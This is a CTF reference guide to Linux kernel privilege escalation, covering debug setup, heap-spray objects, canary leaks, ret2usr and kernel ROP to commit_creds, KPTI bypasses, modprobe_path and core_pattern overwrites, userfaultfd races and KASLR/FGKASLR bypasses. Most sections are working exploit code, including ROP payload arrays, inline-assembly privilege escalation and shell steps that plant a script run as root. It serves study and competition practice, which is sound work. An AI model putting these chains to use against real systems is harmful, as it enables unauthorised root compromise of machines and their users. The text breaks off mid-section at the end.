# CTF Pwn - Linux Kernel Exploitation

## Table of Contents
- [Environment Setup and Recon](#environment-setup-and-recon)
  - [QEMU Debug Environment](#qemu-debug-environment)
  - [Extracting vmlinux and Modifying initramfs](#extracting-vmlinux-and-modifying-initramfs)
  - [GDB Kernel Module Debugging](#gdb-kernel-module-debugging)
  - [Kernel Config Checks](#kernel-config-checks)
  - [FGKASLR Detection](#fgkaslr-detection)
- [Useful Kernel Structures for Heap Spray](#useful-kernel-structures-for-heap-spray)
  - [tty_struct (kmalloc-1024)](#tty_struct-kmalloc-1024)
  - [tty_file_private (kmalloc-32)](#tty_file_private-kmalloc-32)
  - [poll_list (kmalloc-32 to 1024)](#poll_list-kmalloc-32-to-1024)
  - [user_key_payload (kmalloc-32 to 1024)](#user_key_payload-kmalloc-32-to-1024)
  - [setxattr Temporary Buffer (kmalloc-32 to 1024)](#setxattr-temporary-buffer-kmalloc-32-to-1024)
  - [seq_operations (kmalloc-32)](#seq_operations-kmalloc-32)
  - [subprocess_info (kmalloc-128)](#subprocess_info-kmalloc-128)
- [Kernel Stack Overflow and Canary Leak](#kernel-stack-overflow-and-canary-leak)
- [Privilege Escalation Primitives](#privilege-escalation-primitives)
  - [ret2usr (No SMEP/SMAP)](#ret2usr-no-smepsmap)
  - [Kernel ROP with prepare_kernel_cred / commit_creds](#kernel-rop-with-prepare_kernel_cred--commit_creds)
  - [Saving and Restoring Userland State](#saving-and-restoring-userland-state)
- [KPTI Bypass Methods](#kpti-bypass-methods)
  - [Method 1: swapgs_restore Trampoline](#method-1-swapgs_restore-trampoline)
  - [Method 2: Signal Handler (SIGSEGV)](#method-2-signal-handler-sigsegv)
  - [Method 3: modprobe_path via ROP](#method-3-modprobe_path-via-rop)
  - [Method 4: core_pattern via ROP](#method-4-core_pattern-via-rop)
- [modprobe_path Overwrite](#modprobe_path-overwrite)
  - [Technique Overview](#technique-overview)
  - [Bruteforce Without Leak](#bruteforce-without-leak)
  - [Checking CONFIG_STATIC_USERMODEHELPER](#checking-config_static_usermodehelper)
- [core_pattern Overwrite](#core_pattern-overwrite)
- [tty_struct RIP Hijack and kROP](#tty_struct-rip-hijack-and-krop)
  - [kROP via Fake Vtable on tty_struct](#krop-via-fake-vtable-on-tty_struct)
  - [AAW via ioctl Register Control](#aaw-via-ioctl-register-control)
- [userfaultfd Race Stabilization](#userfaultfd-race-stabilization)
  - [Alternative Race Techniques (uffd Disabled)](#alternative-race-techniques-uffd-disabled)
- [SLUB Allocator Internals](#slub-allocator-internals)
  - [Freelist Pointer Hardening](#freelist-pointer-hardening)
  - [Freelist Obfuscation (CONFIG_SLAB_FREELIST_HARDEN)](#freelist-obfuscation-config_slab_freelist_harden)
- [Leak via Kernel Panic](#leak-via-kernel-panic)
- [KASLR and FGKASLR Bypass](#kaslr-and-fgkaslr-bypass)
  - [KASLR Bypass via Stack Leak (hxp CTF 2020)](#kaslr-bypass-via-stack-leak-hxp-ctf-2020)
  - [FGKASLR Bypass (hxp CTF 2020)](#fgkaslr-bypass-hxp-ctf-2020)
- [KPTI / SMEP / SMAP Quick Reference](#kpti--smep--smap-quick-reference)
- [Finding Symbol Offsets Without CONFIG_KALLSYMS_ALL](#finding-symbol-offsets-without-config_kallsyms_all)
- [Exploit Delivery](#exploit-delivery)

---

## Environment Setup and Recon

### QEMU Debug Environment

Standard QEMU launch script for kernel challenge debugging:

```bash
qemu-system-x86_64 \
  -kernel ./bzImage \
  -initrd ./rootfs.cpio \
  -nographic \
  -monitor none \
  -cpu qemu64 \
  -append "console=ttyS0 nokaslr panic=1" \
  -no-reboot \
  -s \
  -m 256M
```

- `-s` enables GDB on port 1234 (`target remote :1234`)
- `-append "nokaslr"` disables KASLR for debugging
- Check QEMU script for: `smep`, `smap`, `kaslr`, `oops=panic`, `kpti=1`
- If `oops=panic` is absent, kernel oops only kills the faulting process (exploitable for info leaks via dmesg)

**Disable mitigations for initial debugging** by modifying the launch script:
```bash
-append "console=ttyS0 nokaslr nopti nosmep nosmap quiet panic=1"
-cpu kvm64   # instead of kvm64,+smep,+smap
```

**Shared directory via virtio-9p** — transfer exploits between host and QEMU without rebuilding initramfs:
```bash
# Add to QEMU launch script:
-fsdev local,security_model=passthrough,id=fsdev0,path=./share \
-device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare

# Inside QEMU guest (add to /init or run manually):
mkdir -p /home/ctf && mount -t 9p -o trans=virtio,version=9p2000.L hostshare /home/ctf

# On host, compile exploit into shared directory:
gcc exploit.c -static -o ./share/exploit
```

### Extracting vmlinux and Modifying initramfs

**Extract vmlinux from bzImage:**
```bash
# Use extract-vmlinux.sh from Linux kernel source (scripts/extract-vmlinux)
./extract-vmlinux ./bzImage > vmlinux

# Extract ROP gadgets
ROPgadget --binary ./vmlinux > gadgets.txt
```

**Extract and modify initramfs:**
```bash
# Extract
mkdir initramfs && cd initramfs
gzip -dc ../initramfs.cpio.gz | cpio -idmv

# Modify /init for debugging (get root shell instead of unprivileged user)
# Comment out: exec su -l ctf
# Add: /bin/sh

# Rebuild
find . -print0 | cpio --null -ov --format=newc | gzip -9 > ../initramfs.cpio.gz
```

**Key modifications to `/init` for debugging:**
- Comment out `exec su -l ctf` (or similar) to keep root privileges
- Comment out `echo 1 > /proc/sys/kernel/kptr_restrict` to see `/proc/kallsyms`
- Comment out `echo 1 > /proc/sys/kernel/dmesg_restrict` to see dmesg
- Comment out `chmod 400 /proc/kallsyms` to read symbol addresses

### GDB Kernel Module Debugging

Load vulnerable kernel module symbols in GDB for source-level debugging:

```bash
# 1. Find module load address (as root inside QEMU)
cat /proc/modules
# vuln 16384 0 - Live 0xffffffffc0000000 (O)

# 2. In GDB, load module symbols at that address
(gdb) target remote localhost:1234
(gdb) add-symbol-file vuln.ko 0xffffffffc0000000
(gdb) b swrite            # breakpoint on module function
(gdb) c

# 3. Inspect stack after breakpoint hit
(gdb) x/20xg $rsp-0x90    # examine stack buffer
(gdb) search "AAAAAAAA"   # find buffer location (pwndbg)
```

**Note:** `/proc/modules` requires root to read actual addresses. Non-root users see zeroed addresses. Modify `/init` to keep root for debugging.

### Kernel Config Checks

| Config | Effect | How to Check |
|--------|--------|-------------|
| SMEP/SMAP/KASLR/KPTI | CPU-level mitigations | Check QEMU run script `-cpu` and `-append` flags |
| FGKASLR | Per-function randomization | `readelf -S vmlinux` section count (see below) |
| `SLAB_FREELIST_RANDOM` | Randomized freelist order | Sequential allocations not adjacent |
| `SLAB_FREELIST_HARDEN` | XOR-obfuscated free pointers | Check freelist pointers in GDB |
| `STATIC_USERMODEHELPER` | Blocks `modprobe_path` overwrite | Disassemble `call_usermodehelper_setup` |
| `KALLSYMS_ALL` | `.data` symbols in `/proc/kallsyms` | `grep modprobe_path /proc/kallsyms` |
| `CONFIG_USERFAULTFD` | Enables userfaultfd syscall | Try calling it; disabled = -ENOSYS |
| eBPF JIT | JIT-compiled BPF filters | `cat /proc/sys/net/core/bpf_jit_enable` (0=off, 1=on, 2=debug) |

Check oops behavior:
- `oops=panic` in QEMU `-append` → oops causes full kernel panic
- Without it → oops kills the faulting process only; dmesg may leak stack/heap/kbase pointers

### FGKASLR Detection

Fine-Grained KASLR randomizes each function independently. Detect by counting ELF sections:

```bash
readelf -S vmlinux | tail -5
# FGKASLR disabled: ~30 sections
# FGKASLR enabled:  36000+ sections (one per function)

file vmlinux
# FGKASLR enabled: "too many section (36140)"
```

---

## Useful Kernel Structures for Heap Spray

These structures are allocated from standard `kmalloc` caches and controlled from userspace. Use them to fill freed slots for UAF exploitation or to leak kernel pointers.

| Structure | Cache | Alloc Trigger | Free Trigger | Use |
|-----------|-------|---------------|--------------|-----|
| `tty_struct` | kmalloc-1024 | `open("/dev/ptmx")` | `close(fd)` | kbase leak, RIP hijack |
| `tty_file_private` | kmalloc-32 | `open("/dev/ptmx")` | `close(fd)` | kheap leak (points to `tty_struct`) |
| `poll_list` | kmalloc-32~1024 | `poll(fds, nfds, timeout)` | `poll()` returns | kheap leak, arbitrary free |
| `user_key_payload` | kmalloc-32~1024 | `add_key()` | `keyctl_revoke()`+GC | arbitrary value write |
| `setxattr` buffer | kmalloc-32~1024 | `setxattr()` | same call path | momentary arbitrary value write |
| `seq_operations` | kmalloc-32 | `open("/proc/self/stat")` | `close(fd)` | kbase leak, RIP hijack |
| `subprocess_info` | kmalloc-128 | internal kernel | internal kernel | kbase leak, RIP hijack |

### tty_struct (kmalloc-1024)

Allocated when `open("/dev/ptmx")`, freed on `close()`. Size: 0x2B8 bytes.

```c
struct tty_struct {
    int magic;                    // +0x00: must be 0x5401 (paranoia check)
    struct kref kref;             // +0x04: reference count
    struct device *dev;           // +0x08
    struct tty_driver *driver;    // +0x10: must be valid kheap pointer
    const struct tty_operations *ops; // +0x18: vtable pointer → kbase leak
    // ...
};
```

- **kbase leak:** Read `tty_struct.ops` — points to `ptm_unix98_ops` (or similar) in kernel `.data`
- **RIP hijack:** Overwrite `tty_struct.ops` with pointer to fake vtable, then `ioctl()` calls `tty->ops->ioctl()`
- **magic** must remain `0x5401` or `tty_ioctl()` returns immediately (paranoia check)
- **driver** must be a valid kernel heap pointer or the kernel will oops

### tty_file_private (kmalloc-32)

Allocated alongside `tty_struct` in `tty_alloc_file()`. Size: 0x20 bytes.

```c
struct tty_file_private {
    struct tty_struct *tty;   // +0x00: pointer to tty_struct in kmalloc-1024
    struct file *file;        // +0x08
    struct list_head list;    // +0x10
};
```

- **kheap leak:** Read `tty_file_private.tty` to get address in `kmalloc-1024`

### poll_list (kmalloc-32 to 1024)

Allocated during `poll()`, freed when `poll()` completes (timer expiry or event trigger). Cache size depends on number of fds polled.

```c
struct poll_list {
    struct poll_list *next;   // +0x00: linked list pointer
    int len;                  // +0x08: number of entries
    struct pollfd entries[];  // +0x0C: variable-length array
};
```

- **Arbitrary free:** Overwrite `poll_list.next` → when `poll()` finishes, it frees all entries in the linked list including the corrupted pointer → UAF on arbitrary address

### user_key_payload (kmalloc-32 to 1024)

Allocated via `add_key()` syscall. Cache size depends on `data` length.

```c
struct user_key_payload {
    struct callback_head rcu;     // +0x00: 16 bytes, untouched until init
    unsigned short datalen;       // +0x10
    char data[];                  // +0x18: user-controlled content
};
```

- First 16 bytes are uninitialized until GC callback — combine with UAF to leak residual heap data
- Free requires `keyctl_revoke()` then wait for GC
- Blocked by default Docker seccomp profile

### setxattr Temporary Buffer (kmalloc-32 to 1024)

`setxattr("file", "user.x", data, size, XATTR_CREATE)` allocates a buffer, copies user data, then frees it in the same call path.

- **Momentary write:** Combine with uninitialized structs to write arbitrary values into freed chunks
- Cannot be used for persistent spray (freed immediately)
- The file passed to `setxattr()` must exist — common pitfall when exploit runs from different directory than expected

### seq_operations (kmalloc-32)

Allocated when opening `/proc/self/stat` (or similar seq_file). Contains function pointers for kbase leak.

### subprocess_info (kmalloc-128)

Internal kernel struct with function pointers. Useful for kbase leak and RIP hijack in specific scenarios.

---

## Kernel Stack Overflow and Canary Leak

Kernel modules with vulnerable read/write handlers often allow stack buffer overflow. The exploitation pattern mirrors userland stack overflows but with kernel-specific register state management.

**Canary leak via oversized read (hxp CTF 2020):**

A vulnerable `hackme_read()` copies from a 32-element stack array `tmp[32]` but allows reading up to 0x1000 bytes — leaking the stack canary and kernel text pointers beyond the buffer.

```c
unsigned long leak[40];
int fd = open("/dev/hackme", O_RDWR);

// Read beyond stack buffer to leak canary + kernel pointers
read(fd, leak, sizeof(leak));

// Stack layout: tmp[32] at rbp-0x98, canary at rbp-0x18
// Canary at index 16 (offset 0x80 from buffer start)
unsigned long cookie = leak[16];

// Kernel text pointer at index 38 → compute KASLR base
unsigned long kernel_base = (leak[38] & 0xffffffffffff0000);
long kaslr_offset = kernel_base - 0xffffffff81000000;
```

**Stack overflow payload structure:**

```c
unsigned long payload[50];
int off = 16;                    // offset to canary position
payload[off++] = cookie;         // canary
payload[off++] = 0x0;            // padding (rbx)
payload[off++] = 0x0;            // padding (r12)
payload[off++] = 0x0;            // saved rbp
payload[off++] = rop_start;      // return address → ROP chain
// ... ROP chain follows ...
write(fd, payload, sizeof(payload));
```

**ioctl-based size check bypass (K3RN3LCTF 2021):**

Some modules gate write length against a global `MaxBuffer` variable that is itself controllable via `ioctl()`:

```c
// Vulnerable pattern in module:
// swrite() checks: if (MaxBuffer < user_size) return -EFAULT;
// sioctl() with cmd 0x20: MaxBuffer = (int)arg;  ← attacker-controlled

// Exploit: increase MaxBuffer before overflow
int fd = open("/proc/pwn_device", O_RDWR);
ioctl(fd, 0x20, 300);            // set MaxBuffer to 300 (buffer is only 128)
write(fd, overflow_payload, 300); // now passes size check → stack overflow
```

**Key insight:** Kernel stack canaries work identically to userland canaries. A vulnerable read handler that copies more bytes than the buffer size leaks the canary and saved registers, including kernel text pointers for KASLR bypass. Look for `ioctl` handlers that modify global variables used in bounds checks — they often bypass write size restrictions.

---

## Privilege Escalation Primitives

### ret2usr (No SMEP/SMAP)

When SMEP and SMAP are disabled, the kernel can directly execute userland code and access userland memory. Hijack RIP to a userland function that calls `prepare_kernel_cred(0)` and `commit_creds()`.

```c
// Addresses from /proc/kallsyms (or leak)
unsigned long prepare_kernel_cred = 0xffffffff814c67f0;
unsigned long commit_creds       = 0xffffffff814c6410;

// Saved userland state for iretq return
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void privesc() {
    __asm__(".intel_syntax noprefix;"
        "movabs rax, %[prepare_kernel_cred];"
        "xor rdi, rdi;"        // prepare_kernel_cred(NULL) → init cred
        "call rax;"
        "mov rdi, rax;"        // commit_creds(new_cred)
        "movabs rax, %[commit_creds];"
        "call rax;"
        "swapgs;"              // restore GS base for userland
        "mov r15, %[user_ss];   push r15;"
        "mov r15, %[user_sp];   push r15;"
        "mov r15, %[user_rflags]; push r15;"
        "mov r15, %[user_cs];   push r15;"
        "mov r15, %[user_rip];  push r15;"
        "iretq;"               // return to userland as root
        ".att_syntax;"
        : : [prepare_kernel_cred] "r"(prepare_kernel_cred),
            [commit_creds] "r"(commit_creds),
            [user_ss] "r"(user_ss), [user_sp] "r"(user_sp),
            [user_rflags] "r"(user_rflags),
            [user_cs] "r"(user_cs), [user_rip] "r"(user_rip));
}
```

After `privesc()` returns to userland, the process has root credentials. Call `system("/bin/sh")` to get a root shell.

### Kernel ROP with prepare_kernel_cred / commit_creds

When SMEP is enabled, build a kernel ROP chain to call `prepare_kernel_cred(0)` → pass result to `commit_creds()` → return to userland.

```c
// Find gadgets: ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax" ./vmlinux
unsigned long pop_rdi_ret = 0xffffffff81006370;
unsigned long mov_rdi_rax_pop1_ret = 0xffffffff816bf740; // mov rdi, rax; ...; pop rbx; ret
unsigned long swapgs_pop1_ret = 0xffffffff8100a55f;      // swapgs; pop rbp; ret
unsigned long iretq = 0xffffffff8100c0d9;

unsigned long payload[50];
int off = 16;   // canary offset
payload[off++] = cookie;
payload[off++] = 0;           // rbx
payload[off++] = 0;           // r12
payload[off++] = 0;           // rbp

// ROP chain: prepare_kernel_cred(0) → commit_creds(result)
payload[off++] = pop_rdi_ret;
payload[off++] = 0x0;                      // rdi = NULL
payload[off++] = prepare_kernel_cred;
payload[off++] = mov_rdi_rax_pop1_ret;     // rdi = rax (new cred)
payload[off++] = 0x0;                      // pop rbx padding
payload[off++] = commit_creds;

// Return to userland
payload[off++] = swapgs_pop1_ret;
payload[off++] = 0x0;                      // pop rbp padding
payload[off++] = iretq;
payload[off++] = user_rip;                 // spawn_shell
payload[off++] = user_cs;                  // 0x33
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;                  // 0x2b
```

**Critical gadget: `mov rdi, rax`** — needed to pass the return value of `prepare_kernel_cred()` (in RAX) to `commit_creds()` (expects argument in RDI). Search for variants like `mov rdi, rax; ... ; ret` that may clobber other registers.

**Tool:** `ropr` is faster than ROPgadget for large kernel images:
```bash
ropr --no-uniq -R "^pop rdi; ret;|^mov rdi, rax|^swapgs|^iretq" ./vmlinux
```

### Saving and Restoring Userland State

Before triggering the kernel exploit, save userland register state for the `iretq` return:

```c
unsigned long user_cs, user_ss, user_sp, user_rflags, user_rip;

void save_userland_state() {
    __asm__(".intel_syntax noprefix;"
        "mov %[cs], cs;"
        "mov %[ss], ss;"
        "mov %[sp], rsp;"
        "pushf; pop %[rflags];"
        ".att_syntax;"
        : [cs] "=r"(user_cs), [ss] "=r"(user_ss),
          [sp] "=r"(user_sp), [rflags] "=r"(user_rflags));
    user_rip = (unsigned long)spawn_shell;  // function to call after return
}

void spawn_shell() {
    if (getuid() == 0) {
        printf("[+] root!\n");
        system("/bin/sh");
    } else {
        printf("[-] privesc failed\n");
        exit(1);
    }
}
```

**Register values (x86_64 userland):**
- `CS` = 0x33 (64-bit user code segment)
- `SS` = 0x2b (64-bit user stack segment)
- `RSP` = current userland stack pointer
- `RFLAGS` = current flags register
- `RIP` = address of post-exploit function (e.g., `spawn_shell`)

---

## KPTI Bypass Methods

KPTI (Kernel Page Table Isolation) separates kernel and user page tables. A simple `swapgs; iretq` fails because the user page table is not restored. Four bypass approaches:

### Method 1: swapgs_restore Trampoline

The kernel function `swapgs_restore_regs_and_return_to_usermode` handles the full KPTI return sequence. Jump to offset +22 to skip the register-restore prologue and land directly at the CR3-swap + `swapgs` + `iretq` sequence:

```c
// Symbol from /proc/kallsyms or vmlinux
unsigned long kpti_trampoline = 0xffffffff81200f10;

// In ROP chain, after commit_creds:
payload[off++] = kpti_trampoline + 22;  // skip to mov rdi,rsp; ... swapgs; iretq
payload[off++] = 0x0;                    // padding (popped by trampoline)
payload[off++] = 0x0;                    // padding
payload[off++] = user_rip;
payload[off++] = user_cs;
payload[off++] = user_rflags;
payload[off++] = user_sp;
payload[off++] = user_ss;
```

**Key insight:** The +22 offset skips the function's register pop/restore sequence and enters directly at the point where it swaps CR3, does `swapgs`, and `iretq`. This offset may vary between kernel versions — verify by disassembling the function.

### Method 2: Signal Handler (SIGSEGV)

Register a SIGSEGV handler before the exploit. When `iretq` returns without KPTI handling, the page fault triggers SIGSEGV, which the handler catches to spawn a shell:

```c
#include <signal.h>

void spawn_shell() {
    if (getuid() == 0) system("/bin/sh");
}

// Before exploit:
struct sigaction sa;
sa.sa_handler = spawn_shell;
sigemptyset(&sa.sa_mask);
sa.sa_flags = 0;
sigaction(SIGSEGV, &sa, NULL);
```

The ROP chain still calls `commit_creds(prepare_kernel_cred(0))` and does `swapgs; iretq` to userland. Even though the return faults due to wrong page table, the credentials are already committed. The SIGSEGV handler runs with root privileges.

### Method 3: modprobe_path via ROP

Instead of returning to userland, overwrite `modprobe_path` directly from the kernel ROP chain using `pop rax; pop rdi; mov [rdi], rax; ret` gadgets. No KPTI handling needed — the write happens entirely in kernel context.

See [modprobe_path Overwrite](#modprobe_path-overwrite) for the full technique, trigger sequence, and ROP payload.

### Method 4: core_pattern via ROP

Similar to Method 3 but overwrites `core_pattern` with a pipe command (e.g., `"|/evil"`). When any process crashes, the kernel executes the piped program as root.

See [core_pattern Overwrite](#core_pattern-overwrite) for the full technique and how to find the `core_pattern` address.

---

## modprobe_path Overwrite

### Technique Overview

Overwrite the global `modprobe_path` variable (default: `"/sbin/modprobe"`) with a path to an attacker-controlled script. When the kernel encounters a binary with an unknown format, it executes `modprobe_path` as root.

**Requirements:**
1. Arbitrary Address Write (AAW) to overwrite `modprobe_path`
2. Ability to create two files: a malformed binary and an evil script
3. `CONFIG_STATIC_USERMODEHELPER` is disabled

**Steps:**

```bash
# 1. Write evil script
echo '#!/bin/sh' > /tmp/evil.sh
echo 'cat /flag > /tmp/output' >> /tmp/evil.sh
echo 'chmod 777 /tmp/output' >> /tmp/evil.sh
chmod +x /tmp/evil.sh

# 2. Overwrite modprobe_path with "/tmp/evil.sh" using your AAW primitive

# 3. Create and execute a malformed binary (non-printable first 4 bytes)
echo -ne '\xff\xff\xff\xff' > /tmp/trigger
chmod +x /tmp/trigger
/tmp/trigger

# 4. Read the flag
cat /tmp/output
```

**How it works:** `execve()` → `search_binary_handler()` → no format matches → `request_module("binfmt-XXXX")` → `call_modprobe()` → executes `modprobe_path` as root.

**Key insight:** The first 4 bytes of the trigger binary must be non-printable (not ASCII without tab/newline). If they are printable, the kernel skips the `request_module()` call.

### Bruteforce Without Leak

`modprobe_path` has only 1 byte of entropy under KASLR (the randomized page offset). With AAW, brute-force the address:

```python
# modprobe_path base address (from debugging without KASLR)
MODPROBE_BASE = 0xffffffff8265ff00
# Under KASLR, only the 0x65 byte varies
# Try 256 offsets
for byte_guess in range(256):
    addr = (MODPROBE_BASE & ~0xFF0000) | (byte_guess << 16)
    write_string(addr, "/tmp/evil.sh")
    trigger_modprobe()
```

### Checking CONFIG_STATIC_USERMODEHELPER

If enabled, `call_usermodehelper_setup()` ignores `modprobe_path` and uses a hardcoded constant.

**Detection via disassembly:**

```bash
# 1. Get function address
cat /proc/kallsyms | grep call_usermodehelper_setup

# 2. Set GDB breakpoint and trigger
echo -ne '\xff\xff\xff\xff' > /tmp/nirugiri && chmod +x /tmp/nirugiri && /tmp/nirugiri

# 3. In GDB, disassemble and check:
# NOT set: rdi saved into r14 at +9, used at +127 → modprobe_path passed through
# SET: immediate constant at +122 instead of r14 → 1st arg (modprobe_path) ignored
```

**When set:** `sub_info->path = CONFIG_STATIC_USERMODEHELPER_PATH` (constant). Overwriting `modprobe_path` has no effect. Look for alternative LPE techniques.

---

## core_pattern Overwrite

Alternative to `modprobe_path`. Overwrite `/proc/sys/kernel/core_pattern` (or the internal `core_pattern` variable) with a pipe command. When a process crashes, the kernel executes the specified command as root to handle the core dump.

```bash
# core_pattern with pipe: first char '|' means execute as command
# Overwrite core_pattern to: "|/tmp/evil.sh"
# Then crash a process to trigger
```

**Finding the offset:** `core_pattern` is not exported via `/proc/kallsyms` without `CONFIG_KALLSYMS_ALL`. To find it:

1. Set breakpoint on `override_creds()` (called by `do_coredump()`)
2. Crash a process: `int main() { ((void(*)())0)(); }`
3. After `override_creds` returns, disassemble — look for `movzx` loading from a data address
4. That address is `core_pattern`

```text
(gdb) finish
(gdb) x/5i $rip
=> 0xffffffff811b1e98:  movzx r13d, BYTE PTR [rip+0xcfec80]  # 0xffffffff81eb0b20
(gdb) x/s 0xffffffff81eb0b20
0xffffffff81eb0b20: "core"
```

---

## tty_struct RIP Hijack and kROP

### kROP via Fake Vtable on tty_struct

With sequential write over `tty_struct` (at least 0x200 bytes), build a two-phase kROP chain entirely within the structure:

```text
tty_struct layout for kROP:
  +0x00: magic, kref   → 0x5401 (preserve paranoia check)
  +0x08: dev            → addr of `pop rsp` gadget (return addr after `leave`)
  +0x10: driver         → &tty_struct + 0x170 (stack pivot target; must be valid kheap addr)
  +0x18: ops            → &tty_struct + 0x50 (pointer to fake vtable)
  ...
  +0x50:                → fake vtable (0x120 bytes), ioctl entry points to `leave` gadget
  ...
  +0x170:               → actual ROP chain (commit_creds, prepare_kernel_cred, etc.)
```

**Execution flow:**
1. `ioctl(ptmx_fd, cmd, arg)` → `tty_ioctl()` → paranoia check passes (magic=0x5401)
2. `tty->ops->ioctl()` → jumps to `leave` gadget at fake vtable
3. `leave` = `mov rsp, rbp; pop rbp` — RBP points to `tty_struct` itself
4. RSP now points to `tty_struct + 0x08` (the `dev` field)
5. `ret` to `pop rsp` gadget at `dev`, pops `driver` as new RSP
6. RSP now at `tty_struct + 0x170` → actual ROP chain runs

**Key insight:** RBP points to `tty_struct` at the time of the vtable call. The `leave` instruction pivots the stack into the structure itself, enabling a two-phase bootstrap: first `leave` to enter the structure, then `pop rsp` to jump to the ROP chain area.

**Alternative:** The gadget `push rdx; ... pop rsp; ... ret` at a fixed offset in many kernels enables direct stack pivot via `ioctl`'s 3rd argument (RDX is fully controlled):

```c
// ioctl(fd, cmd, arg) → RDX = arg (64-bit controlled)
// Gadget: push rdx; mov ebp, imm; pop rsp; pop r13; pop rbp; ret
// Effect: RSP = arg → ROP chain at user-specified address
ioctl(ptmx_fd, 0, (unsigned long)rop_chain_addr);
```

### AAW via ioctl Register Control

When full kROP is not needed, use `tty_struct` for Arbitrary Address Write (AAW) to overwrite `modprobe_path`:

Register control from `ioctl(fd, cmd, arg)`:
- `cmd` (32-bit) → partial control of RBX, RCX, RSI
- `arg` (64-bit) → full control of RDX, R8, R12

Write gadget in fake vtable: `mov DWORD PTR [rdx], esi; ret`

```c
// Repeated ioctl calls write 4 bytes at a time to modprobe_path
for (int i = 0; i < 4; i++) {
    uint32_t val = *(uint32_t*)("/tmp/evil.sh\0\0\0\0" + i*4);
    ioctl(ptmx_fd, val, modprobe_path_addr + i*4);
}
```

---

## userfaultfd Race Stabilization

`userfaultfd` (uffd) makes kernel race conditions deterministic by pausing execution at page faults.

**How it works:**
1. `mmap()` a region with `MAP_PRIVATE` (no physical pages allocated)
2. Register the region with `userfaultfd` via `ioctl(UFFDIO_REGISTER)`
3. When the kernel accesses this region (e.g., during `copy_from_user()`), a page fault occurs
4. The faulting kernel thread blocks until userspace handles the fault
5. During the block, the exploit modifies shared state (freeing objects, spraying heap, etc.)
6. Userspace resolves the fault via `ioctl(UFFDIO_COPY)`, kernel thread resumes

```c
// Setup
int uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);
struct uffdio_api api = { .api = UFFD_API, .features = 0 };
ioctl(uffd, UFFDIO_API, &api);

// Register mmap'd region
void *region = mmap(NULL, 0x1000, PROT_READ|PROT_WRITE,
                    MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
struct uffdio_register reg = {
    .range = { .start = (unsigned long)region, .len = 0x1000 },
    .mode = UFFDIO_REGISTER_MODE_MISSING
};
ioctl(uffd, UFFDIO_REGISTER, &reg);

// Fault handler thread
void *handler(void *arg) {
    struct pollfd pfd = { .fd = uffd, .events = POLLIN };
    while (poll(&pfd, 1, -1) > 0) {
        struct uffd_msg msg;
        read(uffd, &msg, sizeof(msg));
        // >>> RACE WINDOW: kernel thread is paused <<<
        // Free target object, spray heap, etc.

        // Resolve fault to resume kernel
        struct uffdio_copy copy = {
            .dst = msg.arg.pagefault.address & ~0xFFF,
            .src = (unsigned long)src_page,
            .len = 0x1000
        };
        ioctl(uffd, UFFDIO_COPY, &copy);
    }
}
```

**Split object over two pages:** Place a kernel object so it spans a page boundary. The first page is normal; the second triggers uffd. The kernel processes the first half, then blocks on the second half — the race window occurs mid-operation.

### Alternative Race Techniques (uffd Disabled)

When `CONFIG_USERFAULTFD` is disabled or uffd is restricted to root:

1. **Large `copy_from_user()` buffer:** Pass an enormous buffer to slow down the copy operation, widening the race window
2. **CPU pinning + heavy syscalls:** Pin racing threads to the same core; use heavy kernel functions to extend the timing window
3. **Repeated attempts:** Pure race without stabilization — run exploit in a loop. Success rate varies (1% to 50% depending on timing)
4. **TSC-based timing (Context Conservation):** Loop checking TSC (Time Stamp Counter) before entering the critical section to confirm execution is at the beginning of its CFS timeslice — reduces scheduler preemption during the race

---

## SLUB Allocator Internals

### Freelist Pointer Hardening

Since kernel 5.7+, free pointers in SLUB objects are placed in the **middle** of the object (word-aligned), not at offset 0:

```c
// From mm/slub.c
if (freepointer_area > sizeof(void *)) {
    s->offset = ALIGN(freepointer_area / 2, sizeof(void *));
}
```

**Impact:** Simple buffer overflows from the start of a freed chunk cannot reach the free pointer. Underflows from adjacent chunks may still work.

### Freelist Obfuscation (CONFIG_SLAB_FREELIST_HARDEN)

When enabled, free pointers are XOR-obfuscated with a per-cache random value:

```text
stored_ptr = real_ptr ^ kmem_cache->random
```

**Detection:** In GDB, find `kmem_cache_cpu` (via `$GS_BASE + kmem_cache.cpu_slab` offset), follow the `freelist` pointer, and check if the stored values look like valid kernel addresses. If not, obfuscation is active.

---

## Leak via Kernel Panic

When KASLR is disabled (or layout is known) and the kernel uses `initramfs`:

```nasm
jmp &flag   ; jump to the address of the flag file content in memory
```

The kernel panics and the panic message includes the faulting instruction bytes in the `CODE` section — these bytes are the flag content.

**Prerequisites:** No KASLR (or full layout knowledge), `initramfs` (flag is loaded into kernel memory), RIP control.

---

## KASLR and FGKASLR Bypass

### KASLR Bypass via Stack Leak (hxp CTF 2020)

Leak a kernel text pointer from the stack to compute the KASLR slide:

```c
// Kernel base without KASLR
#define KERNEL_BASE 0xffffffff81000000

unsigned long leak[40];
read(fd, leak, sizeof(leak));  // oversized read from vulnerable module

// leak[38] contains a randomized kernel text pointer
unsigned long kaslr_offset = (leak[38] & 0xffffffffffff0000) - KERNEL_BASE;

// Apply offset to all addresses
unsigned long commit_creds_kaslr = commit_creds + kaslr_offset;
unsigned long pop_rdi_ret_kaslr = pop_rdi_ret + kaslr_offset;
```

**Other KASLR leak sources:**
- `/proc/kallsyms` (if `kptr_restrict != 1`)
- `dmesg` (if `dmesg_restrict != 1`)
- Kernel oops messages (if oops doesn't panic)
- UAF reading freed kernel objects containing text pointers
- `modprobe_path` has 1-byte entropy — brute-forceable with AAW

### FGKASLR Bypass (hxp CTF 2020)

FG-KASLR randomizes individual functions, but the early `.text` section (up to approximately offset `0x400dc6`) remains at a fixed offset from the kernel base. Gadgets from this range are safe to use.

**Method 1: Use only unaffected `.text` gadgets**

```bash
# Find gadgets only in the non-randomized range
ropr --no-uniq -R "^pop rdi; ret;|^swapgs" ./vmlinux | \
    awk -F: '{if (strtonum("0x"$1) < 0xffffffff81400dc6) print}'
```

`swapgs_restore_regs_and_return_to_usermode` is located in the unaffected `.text` section and can be used with only the KASLR base offset.

**Method 2: Resolve randomized functions via `__ksymtab`**

`__ksymtab` entries use relative offsets, not absolute addresses. The `__ksymtab` section itself is not randomized by FG-KASLR:

```c
// struct kernel_symbol { int value_offset; int name_offset; int namespace_offset; };
// Real address = &ksymtab_entry + entry.value_offset

